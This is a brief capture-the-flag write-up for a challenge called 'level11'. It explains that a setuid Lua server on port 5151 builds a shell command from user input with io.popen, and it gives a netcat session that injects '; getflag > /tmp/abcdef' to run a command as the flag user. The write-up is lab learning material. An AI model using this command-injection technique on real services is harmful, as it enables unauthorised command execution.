## level11

1. Check files in current working directory (home dir)
    - `-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua*`

A basic lua script, it represents the code for a server running on port `5151`, which indeed is running on the machine.

This challenge is easy, here are the problems :

1. The lua script uses a `io.popen` function to.. compute a hash
    * `prog = io.popen("echo "..pass.." | sha1sum", "r")`
    * Here the raw string `pass` is concatenated to the string `echo` and piped to `sha1sum`, so we can inject a command here.
2. idk there's a lib to compute sha1 without using pipes

Anyway just run this and voilà :

```bash
nc 127.0.0.1 5151
; getflag > /tmp/abcdef
cat /tmp/abcdef
```